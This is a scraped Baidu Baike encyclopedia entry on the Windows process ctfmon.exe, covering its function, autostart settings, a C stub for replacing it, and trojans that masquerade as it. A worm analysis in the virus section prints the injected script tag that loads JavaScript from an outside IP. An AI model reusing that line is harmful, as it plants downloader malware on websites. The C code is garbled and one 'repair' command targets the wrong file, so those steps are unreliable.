百度首页|登录注册

新闻网页贴吧知道音乐图片视频地图百科文库

帮助
首页自然文化地理历史生活社会艺术人物经济科技体育图片数字博物馆核心用户百科商城下载体验最新版客户端
ctfmon.exe

求助编辑百科名片

ctfmon.exe是Microsoft Office产品套装的一部分，是有关输入法的一个可执行程序。它可以选择用户文字输入程序，和微软Office XP语言条。这不是纯粹的系统程序，但是如果终止它，可能会导致不可知的问题。另外，ctfmon.exe可能被感染上木马而成为病毒程序。
目录

基本信息
功能作用
设置方法
安全相关
7.病毒行为
8.文件介绍
展开
基本信息
功能作用
设置方法
安全相关
7.病毒行为
8.文件介绍
展开
编辑本段
基本信息

进程信息
进程名称：Alternative User Input Services
出品者：Microsoft Corp
属于：Microsoft Office Suite
系统进程：是
后台程序：是
使用网络：否
硬件相关：否
常见错误：未知N/A
常见错误：未知N/A
安全等级 (0-5）： 0
间谍软件：否
内存大小：3664k
广告软件：否
病毒：否
木马：否
文件信息
软件类型：国产软件
授权方式：免费软件
界面语言：简体中文
软件大小：19KB
文件类型：.exe
运行环境：Win2003,WinXP,win7,win8，Win2000,Win9X[1]
编辑本段
功能作用

Ctfmon.exe 监视活动窗口，并为语音识别、书写识别、键盘、翻译和其他中文可选用户输入方法技术提供文本输入服务支持。
缺少ctfmon进程可能造成的影响
网络上有大量主张中止ctfmon进程的讨论，但是在windows vista，windows 2008,windows 7中，缺少ctfmon进程会引起输入法的不正常行为，常见的情况是用户忽然无法在输入法开启的情况下，以按空格的方式输入可选字的第一个字的情况，刚按下空格时，输入法即被切换为英文。
在这种情况下，仍然可以用数字键来选择要输入的文字。
解决办法是重新运 ctfmon 进程。方法是：
⒈点击“开始”菜单，选择“运行”。
⒉输入：ctfmon.exe
⒊点击“运行”按钮。
编辑本段
设置方法

程序ctfmon.exe，XP下系统默认情况下是随电脑开机而自动启动的（Win7虽然也有此文件，但并不会随系统自动启动）[2]。如果你设置了ctfmon.exe不随机自动启动，进入系统后你的电脑任务栏中的输入法图标（即语言栏）就不见了。
要设置ctfmon.exe随机自动启动，可以单击“开始”——>；“运行”——>；输入“msconfig”（引号不要输入），回车——>；打开“系统配置使用程序”窗口——>；选择“启动”页，找到ctfmon项并在其前面打上钩，按“应用”、“确定”，重启机器即可生效。
家里系统是Windows7的，不能像XP的选项操作，如果ctfmon.exe并没有删除，可工具栏选项上没有语言栏的选项的话，打开操作面板\区域和语言\键盘和语言\更改键盘\语言栏，将“停靠于任务栏”和“在任务栏中显示其他语言栏图标”勾上即可。
如果在“启动”页，找不到ctfmon项，说明注册表中已将该项删除，可以单击“开始”——>；“运行”——>；输入“regedit”（引号不要输入），回车——>；打开“注册表编辑器”，定位到HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run，在窗口的右侧新建名字为ctfmon.exe的字符串值（REG_SZ），并将其值设置为“C:\WINDOWS\system32\ctfmon.exe”，然后关闭注册表编辑器，再执行前一步的操作即可。
当语言栏消失，且无法通过工具栏恢复时，我们也可以从系统盘中的\WINDOWS\system32\ctfmon.exe找到ctfmon.exe文件并复制，然后点击“开始”菜单，找到启动选项，右击启动——打开，然后把复制的ctfmon.exe文件粘贴到打开的启动文件夹中。
如果不运行高级文字服务，Ctfmon.exe 几乎不使用系统资源。高级文字服务是 Ctfmon.exe 通过 TIP 控制的输入技术（语音识别、书写识别和输入方法编辑器）。
Ctfmon.exe 是负责控制中文可选用户输入方法技术的文件。它启动语言栏组件（在任务栏中），并一直在后台运行，甚至在退出 Office XP 程序之后也是如此。每次启动 Windows 时，它也会启动，并一直在后台运行，而与 Office XP 程序是否启动无关。不能根据需要加载和卸载中文可选用户输入方法系统。在安装 Office XP 中文可选用户输入方法组件后，Ctfmon.exe 在 Windows 会话期间继续在后台运行。
如何解决关闭 ctfmon.exe后出现输入法切换快捷键乱掉
注意：以下的处理方法不能保证完全不会危害您的计算机。请在采用之前认真考虑。
如果你的win2000系统装了officeXP或以上版本，它会在你和系统里留下一个ctfmon.exe文件，并自动启动运行，他困扰了无数的网友。
首先我们来说一下它对用户界面和操作体验的一些影响。
⒈ 无论打开什么窗口，总会弹出一个输入法工具体，并且默认是中文输入。
⒉ 它替换了原来的区域和输入法设置，并以一个文字服务的设置取而代之，而且不能设置默认的输入法。
⒊ 结束掉原来的输入法工具进程internat.exe，并令他不能在开机时起动。
⒋ 将自己放在开机时启动的程序列表中，除非修改注册表，否则无法去除。
⒌ 像病毒一样有重生能力，当你把ctfmon.exe删了以后，他又会随着Office的启动而重新生成。
⒍ 当你结束了ctfmon.exe后，经常会出现输入法切换快捷键乱掉的情况。
第一步：右击任务栏空白处，点“任务管理器”。
第二步：找到ctfmon.exe，并终止它。
第三步：在系统目录下的system32目录下找到ctfmon.exe，删除掉。
第四步：写一个最简单的api程序（代码见附录），编译后放到ctfmon.exe所在目录，并更名为ctfmon.exe。
第五步：点击“开始”菜单，点击“运行”，输入internat.exe后点击确定。
第六步：重起计算机。
附：
⒈ 程序代码如下：（注意：以下程序需要用Visual C++编译。）
#include <windows.h>
int APIENTRY WinMain(HINSTANCE,HINSTANCE,LPTSTR,int)
{HANDLE m_hMutex = CreateMutex(NULL,TRUE,"ctfmon.exe");
if(GetLastError() != ERROR_ALREADY_EⅪSTS)
while ⑴ Sleep(INFINITE);
return 0;}
⒉ 如果执行后发现word的输入法无法正确使用，解决办法如下：
第一步：打开word
第二步：点击“工具”菜单中的“选项”子菜单。点击“编辑”选项卡。
第三步：清除“输入法控制处于活动状态”的复选。点击“确定”
第四步：点击“工具”菜单中“语言”子菜单中的“设置语言”项。
第五步：在列表中选择“英语 美国”，点击确定。
第六步：关闭Word，重启计算机。
另外的解决方法：开始－运行－输入“regedit”－找到“HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layouts”－在下面的分支找到美国英语删除就行了
编辑本段
安全相关

快速排查
如果你怀疑此进程有些不正常，那么我们用下面的一些方法快速的察觉出Ctfmon.exe相关的病毒,若发现情况建议马上更新杀毒软件最新病毒库并对电脑全盘扫描。
1、如果发现Ctfmon.exe不在System32目录下；
2、如果此进程发现占用资源太多；
3、如果Win7系统运行了Ctfmon.exe；
病毒介绍
2010年，可牛安全中心截获到了一种替换系统ctfmon.exe的病毒（潜行者病毒）。随后，“ctfmon.exe病毒”开始呈爆发式传播，牢牢占据病毒排行榜的第一位。
“感染系统ctfmon.exe”文件病毒爆发，数百万网游玩家可能被盗号！
“该病毒”以感染Windows系统文件ctfmon.exe作为跳板，绕过杀毒软件及网游保护系统。一旦受感染的系统文件被网络游戏加载到内存，便会加载各种流行网游盗号木马（特征是扩展名为drv），盗取《天龙八部》，《剑网三》，《QQ地下城勇士》，《CF》等流行网游的账号。同时，也会使游戏过程中频繁卡机。
截止今天，可牛杀毒安全中心监测到有数百万网游玩家的电脑感染了ctfmon.exe病毒，造成ctfmon.exe等系统文件丢失，以及网游账号被盗。
盗号木马伪装ctfmon.exe等系统文件伺机盗取网游账号
2009年开始，木马感染系统文件成为新趋势。“系统文件替换病毒”的出现，意味着网游盗号产业进一步细化分工，可以为了绕过安全软件和网游保护而制作一种独立病毒。在过去，木马为了侵入网游，必须在启动项中进行加载，所以安全软件可以通过启动项检查发现是否有木马进入系统。而像“ctfmon.exe病毒”这种通过感染ctfmon.exe文件，从而将木马加载进网游进程的形势，可以绕过大多数安全软件的检测。这也是“系统文件感染病毒” 至今没有被主流杀软查杀的原因。
软件修复
多数杀毒软件对“潜行者”病毒无法查杀，或查杀后造成系统找不到ctfmon.exe文件，导致运行网游时弹出系统文件丢失提示。从百度、谷歌等搜索引擎搜索量情况来看，网友对ctfmon.exe文件的搜索量持续回升， 也可以确定网友对杀毒软件只管查杀，不管修复是如此无奈。
可牛杀毒安全中心建议，《天龙八部》、《剑网3》、《QQ地下城与勇士》、《穿越火线》等网游的玩家，立即运行《可牛免费杀毒》进行全盘扫描，检测系统是否已经被“ctfmon.exe病毒”入侵。
如果因其他杀软查杀，导致电脑出现ctfmon.exe文件丢失，可以使用ctfmon.exe可牛系统文件修复工具进行系统文件完美修复！
下载修复
步骤1：将Windows XP安装 光盘插入你的光驱，然后依次点击“开始→运行”。
步骤2：在“运行”窗口中输入“expand x：\i386\rundll32.ex_c：\windows\system32 \rundll32.exe”命令并回车执行（其中“x”为光驱的盘符）。
步骤3：修复完毕后，重新启动系统即可。[3]
编辑本段
7.病毒行为

感染虫下载器45056Win32.Troj.Downloader.c.45056
这是一个蠕虫病毒。（蠕虫病毒比以前少了很多，但对局域网的影响会很大）
该病毒运行后，会指定的网络上下载病毒程序，并且会搜索局域网内机器，以弱口令进行尝试性连接
一旦连接成功，则判断该机器弱口令是否有足够的权限，有则向该远程机器发送恶意数据，然后利用windows漏洞来下载程序，予以执行.
⒈病毒运行后，产生以下病毒文件
%WINDIR%\ SYSTEM32\tmipo.bat
%WINDIR%\ SYSTEM32\taimpo.txt
⒉添加病毒启动项
启动项名：svchost对应路径：%Documents and Settings%\Administrator\桌面\ctfmon.exe
⒊病毒会触发taimpo.bat病毒文件，用来关闭"360安全卫士",使用户的安全性能降低.
⒋病毒会检测连接的远程机器，当远程机器的登录木马是弱口令时，则会对该机器进行攻击，最后下载adi.vbs到用户机器上.
⒌遍历磁盘，查找*.htm、*.PHP、*.ASP等网页文件，开始感染，插入一段JS代码：
script language=javascript src=http://218.**.**.248/qq.js
这段脚本病毒，可能会被用作下载更多的木马程序，利用蠕虫攻击传播，利用下载器种植木马，是目前黑客偷东西惯用的手法。
解决方案：
怕麻烦直接去下载专杀工具：
⒈删除病毒生成的三个文件，可使用清理专家的文件粉碎器完成操作。
%WINDIR%\ SYSTEM32\tmipo.bat （%WINDIR%缺省是c:\windows目录）
%WINDIR%\ SYSTEM32\taimpo.txt
%Documents and Settings%\Administrator\桌面\ctfmon.exe（伪装成输入法的程序名）
⒉使用金山卫士的修复功能，将病毒添加的注册表启动项删除。
防范措施：
⒈最最重要的，是给系统打补丁，登录系统一定要使用口令，就算是电脑只有自己一个人用，也需要安全的登录口令，口令不能太简单，以免被远程攻击工具猜解。（因为只要电脑接入互联网，就能给木马以机会.）
其它方案基本是相通的，不在缀述！
中毒后的解决办法
将杀毒软件升级到最近版本进行查杀，如果查杀完毕后发现输入法无法正常使用的情况，请下载附件中的文件，将其解压后复制到“C:\Windows\system32\” 文件夹即可解决。
备注：如果 ctfmon.exe 位于在目录 C:\Windows下，那么威胁危险度是 70%。文件大小是 2,811,732 字节 （占总出现比率 37%），20,062 字节，50,670 字节，18,353 字节，95,744 字节。应用程序是不可见的。这是个不知名的文件存放于 Windows 目录。这个不是 Windows 核心文件。没有进程的相关资料。ctfmon.exe 是有能力可以 隐藏自身，监控应用程序。[4]
编辑本段
8.文件介绍

ctfmon.exe （5.1.2600.1106）
​
名字：
Windows XP Home Edition,Deutsch
执照：
商业
​
文件道路：
C:\WINDOWS\system32\dllcache \ ctfmon.exe
文件日期：
2002-08-29 14:00:00
版本：
5.1.2600.1106
文件大小：
13.312 字节
​
CRC32:
2E4072CA
MD5:
E5EE 2F47 00B6 A85F 0D45 A18C 67DA 500F
SHA1:
1D1B F316 C6D3 E91F 8975 60FC E77F 038A FB72 56FF
​
公司名称：
Microsoft Corporation
文件描述：
CTF Loader
文件操作系统：
Windows NT,Windows 2000,Windows XP,Windows 2003
文件类型：
Dynamic Link Library (DLL)
文件版本：
5.1.2600.1106
内部名：
CTFMON
法律版权：
&copy; Microsoft Corporation. All rights reserved.
原始的文件名：
CTFMON.EXE
产品名称：
Microsoft&reg; Windows&reg; Operating System
产品版本：
5.1.2600.1106
参考资料
1．  ctfmon.exe百科  ．百度百科 ．
2．  系统为什么要运行Ctfmon.exe进程  ．穆童博客 [引用日期2012-12-5] ．
3．  ctfmon.exe部分解决方法  ．天涯问答 ．
4．  百度知道-ctfmon.exe  ．
扩展阅读：
1
Win7开机提示‘CTFMON.EXE程序不启动’的解决方法 http://www.shusp.com/article-1078-1.html
开放分类：
电脑 系统 进程信息 输入法 系统进程
百度百科中的词条正文与判断内容均由用户提供，不代表百度百科立场。如果您需要解决具体问题（如法律、医学等领域），建议您咨询相关领域专业人士。
本词条对我有帮助
添加到搜藏
分享到:
 更多
合作编辑者
hsw0922 ， mtoou ， 龙之轩明扬 ， w_ou ， 天地分隔 ， w杀啥傻煞c ，  yangke19941112 ， poppy1860 ， 百科ROBOT ， 词条超人
如果您认为本词条还需进一步完善，百科欢迎您也来参与 编辑词条 在开始编辑前，您还可以先学习如何编辑词条
如想投诉，请到百度百科投诉中心；如想提出意见、建议，请到百度百科吧。

百度百科内容方针
提倡有可靠依据、权威可信的内容
鼓励客观、中立、严谨的表达观点
不欢迎恶意破坏、自我或商业宣传
在这里你可以
编辑
质疑
投诉
全方位的质量监督
学术委员会：为亿万网友提供权威意见
质量委员会：把控质量，做更好的知识
词条统计
浏览次数：约 851432次
编辑次数：43次 历史版本
最近更新：2013-01-12
创建者：你欠揍吗
更多贡献光荣榜
辛勤贡献者：
yangke19941112		 版本
chenqihubei		 版本
yzyba		 版本
jack2li		 版本
最新动态
熊猫茶秒杀切糕：

百科消息：
百科新版客户端新增图册等功能
北京民俗博物馆加入数字博物馆
有奖调研：说说你眼中的百科
写游记赢泰国免费名额
漫画家倾力巨献潮人专属手机壁纸
百科全新内容方针提升词条权威
© 2013 Baidu 使用百度前必读 | 百科协议 | 百度百科合作平台

